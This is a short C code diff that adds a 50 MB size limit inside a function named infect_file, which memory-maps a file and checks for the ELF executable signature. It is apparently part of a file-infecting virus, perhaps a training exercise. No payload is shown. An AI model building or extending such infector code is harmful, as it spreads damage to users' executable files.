@@ -148,6 +148,8 @@ static void		infect_file(char *path)
 	init_info(&info);
 	ft_sysfstat(fd, &st);
 	info.file_size = st.st_size;
+	if (info.file_size > 50*1024*1024)
+		goto end_close;
 	if ((info.file = ft_sysmmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
 		goto end_close;
 	if ((magic = *((uint32_t *)(info.file))) != 0x464C457F)
